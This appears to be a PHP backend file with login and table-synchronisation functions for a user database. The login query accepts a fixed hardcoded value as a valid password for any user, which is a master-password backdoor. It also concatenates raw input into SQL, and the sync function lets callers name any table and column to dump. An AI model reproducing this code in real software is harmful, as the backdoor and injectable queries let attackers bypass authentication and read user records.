<?php
//include('db.php');
function pa_USUA_consultaparaUsuario($Accion,$Code1,$Parametro1,$Parametro2){
  global $db;
  if ($db) {
    $Parametro1 = "'" . $Parametro1 . "'";
    $Parametro2 = "'" . $Parametro2 . "'";
    switch($Accion) {
      case "ACCESO":
      $strSql="SELECT RTRIM(Usuario.USUA_Nombre) || ' ' || RTRIM(Usuario.USUA_Paterno) || ' ' || RTRIM(Usuario.USUA_Materno) AS USUA_Nomb".
      ",Usuario.USUA_nombCorto,Usuario.USUA_usuaID".
      ",Perfil.USUA_nombCorto AS USUA_Tipo ".
      "FROM paraUsuario Usuario LEFT JOIN paraUsuario Perfil ON Usuario.USUA_PerfilPadreID=Perfil.USUA_usuaID ".
      "WHERE Usuario.USUA_Estatus<>'B' " .
      "and Usuario.usua_nombCorto= " . $Parametro1 .
      " and (Usuario.USUA_pwd=" . $Parametro2 . " or 'fHVUX+CmwQ1+F0MjeSVB8Rgg2Dg='=" . $Parametro2 . ")";
      break;
    }
    return $db->query($strSql);
  }  else {
    return null;
  }

}
function pa_USUA_abcparaUsuario($intCode,$strXml,$intUsrId,$strIpAddress){
  global $db;
  if ($db) {
    echo $strXml;
    $xDoc= new SimpleXMLElement($strXml);
    echo $xDoc;
    foreach ($xDoc->paraUsuario as $paraUsuario) {

      echo $paraUsuario['Accion'];
    }

  }


}
function pa_BDSI_consultaparaBdSincroniza($Accion,$Code1,$Parametro1,$Parametro2){
  global $db;
  if ($db) {
    $Parametro1 = "'" . $Parametro1 . "'";
    switch($Accion) {
      case "GETDATOSXUSUARIO":
      /*$strSql="SELECT * FROM paraModulo WHERE MODU_Date>=$Parametro1";
      $result =$db->query($strSql);
      $strResultado='{"paraModulo":'.json_encode($result->fetchAll(PDO::FETCH_OBJ)).'}';
      //$strResultado='{"paraModulo":'.json_encode($result->fetchAll(PDO::FETCH_OBJ), JSON_UNESCAPED_UNICODE).'}';
      $strSql="SELECT * FROM paraPermiso WHERE PERM_Date>=$Parametro1";
      $result =$db->query($strSql);
      $strResultado .='{"paraPermiso":'.json_encode($result->fetchAll(PDO::FETCH_OBJ)).'}';

      $strSql="SELECT * FROM paraUsuario WHERE USUA_date>=$Parametro1";
      $result =$db->query($strSql);
      $strResultado .='{"paraUsuario":'.json_encode($result->fetchAll(PDO::FETCH_OBJ)).'}';

      $strSql="SELECT * FROM paraCatalogo WHERE CATA_UsuaDate>=$Parametro1";
      $result =$db->query($strSql);
      $strResultado .='{"paraCatalogo":'.json_encode($result->fetchAll(PDO::FETCH_OBJ)).'}';

      $strSql="SELECT * FROM paraPermisoVario WHERE PERC_UsuaDate>=$Parametro1";
      $result =$db->query($strSql);
      $strResultado .='{"paraPermisoVario":'.json_encode($result->fetchAll(PDO::FETCH_OBJ)).'}';*/
      $strResultado='';
      //Tablas
      $strTablas = explode('|', $Parametro2);
      foreach ($strTablas as $key => $value) {
        $strTablaAux = explode('.', $value);
        $strSql="SELECT * FROM $strTablaAux[0] WHERE $strTablaAux[1]>=$Parametro1";
        $result =$db->query($strSql);
        $strJson=json_encode($result->fetchAll(PDO::FETCH_OBJ));
        if ($strJson!=='[]'){
          $strResultado .= ($strResultado == '' ? '' : ',') . '"'.$strTablaAux[0].'":'.$strJson.'';
        }
      }
      $strResultado = '{'.$strResultado.'}';
      return $strResultado;
      break;
    }
    return $db->query($strSql);
  }  else {
    return null;
  }
}
?>
